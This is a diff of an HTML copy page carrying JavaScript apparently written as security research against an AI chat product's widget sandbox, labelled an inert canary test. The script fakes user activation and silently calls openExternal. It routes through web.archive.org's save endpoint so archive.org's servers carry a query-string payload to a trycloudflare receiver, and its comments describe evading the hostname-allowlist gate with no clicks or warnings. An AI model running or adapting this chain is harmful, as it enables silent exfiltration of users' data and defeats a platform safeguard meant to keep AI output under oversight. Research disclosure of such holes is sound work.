@@ -1,18 +1,19 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>T49g clean copy page</title></head>
+<head><meta charset="utf-8"><title>T49h clean copy page</title></head>
 <body style="font-family:monospace;background:#111;color:#ccc;padding:20px">
-<h2 style="color:#f33">T49g CLEAN COPY PAGE (FULL CHAIN test) &mdash; click Copy, then paste into the playground editor</h2>
+<h2 style="color:#f33">T49h CLEAN COPY PAGE (FULL CHAIN: Wayback proxy) &mdash; click Copy, then paste into the playground editor</h2>
 <button id="copy" style="font-size:18px;padding:10px 20px">Copy code</button>
-<pre id="code" style="background:#000;color:#0f0;padding:12px;white-space:pre;overflow:auto">// T49g - FULL CHAIN: silent openExternal -&gt; trusted-domain user page -&gt; receiver
+<pre id="code" style="background:#000;color:#0f0;padding:12px;white-space:pre;overflow:auto">// T49h - FULL CHAIN via trusted-server proxy: web.archive.org save-page-now
 // (Pluto Security research canary, inert: fake data string only)
-// blogspot.com proved gate-safe (T49f, silent). The researcher's own blog page
-// (pluto-t49-notes.blogspot.com) reads ?d= from its URL and forwards it to the
-// researcher's own receiver. This fires openExternal to that page with a fake
-// canary string. If the tab opens SILENTLY and the receiver logs the canary,
-// the entire exfiltration chain closes with ZERO victim clicks and ZERO
-// warnings: widget capture -&gt; openExternal(gate-trusted domain) -&gt; user JS on
-// the trusted domain -&gt; attacker receiver.
+// Mechanics self-verified via curl (Oct 21): web.archive.org/save/&lt;encoded
+// target&gt; makes archive.org's OWN servers fetch the target URL server-side,
+// query string included - the receiver logged the canary from a plain curl
+// with no browser involved. The openExternal gate (server-side hostname
+// allowlist, presented-host-only per T49d/T49g) sees only web.archive.org.
+// If it is gate-safe, this fires a SILENT tab that makes archive.org fetch
+// our receiver URL with the canary in the query: widget -&gt; silent
+// openExternal -&gt; archive.org server-side fetch -&gt; receiver log.
 (function () {
   try {
     Object.defineProperty(navigator, "userActivation", {
@@ -21,30 +22,30 @@
     });
   } catch (e) {}
 
-  var URL_T49G =
-    "https://pluto-t49-notes.blogspot.com/2026/10/t49g-leak-page-starting.html?d=T49g-blogger-chain-canary";
+  var URL_T49H =
+    "https://web.archive.org/save/https%3A%2F%2Fsame-disc-constructed-brussels.trycloudflare.com%2Fleak%3Fd%3DT49h-wayback-chain-canary";
 
   var d = document;
   var box = d.createElement("div");
-  box.id = "t49g-box";
+  box.id = "t49h-box";
   box.style.cssText = "position:fixed;left:12px;bottom:12px;z-index:2147483647;font:12px Menlo,monospace;color:#ff5252;background:rgba(0,0,0,.85);border:1px solid #ff5252;border-radius:6px;padding:8px 10px;max-width:80vw;white-space:pre-wrap";
-  box.textContent = "T49g FULL CHAIN (inert) - firing in 1s...";
+  box.textContent = "T49h FULL CHAIN (inert) - firing web.archive.org in 1s...";
   d.body.appendChild(box);
 
   setTimeout(function () {
     var api = window.oai || window.openai || window.webplus;
     if (!api || !api.openExternal) {
-      box.textContent = "T49g: no oai.openExternal API found";
+      box.textContent = "T49h: no oai.openExternal API found";
       return;
     }
     try {
-      api.openExternal({ href: URL_T49G });
+      api.openExternal({ href: URL_T49H });
       box.textContent =
-        "T49g FIRED (inert):\npluto-t49-notes.blogspot.com/...?d=T49g-blogger-chain-canary\n\n" +
-        "silent tab = watch the tab: green text says CANARY FORWARDED\n" +
-        "then I check the receiver log for the landing";
+        "T49h FIRED (inert): web.archive.org/save/...?d=T49h-wayback-chain-canary\n\n" +
+        "silent tab (Wayback 'saving...' page) = I check the receiver log next\n" +
+        "dialog = web.archive.org is gated too";
     } catch (e) {
-      box.textContent = "T49g threw: " + e;
+      box.textContent = "T49h threw: " + e;
     }
   }, 1000);
 })();
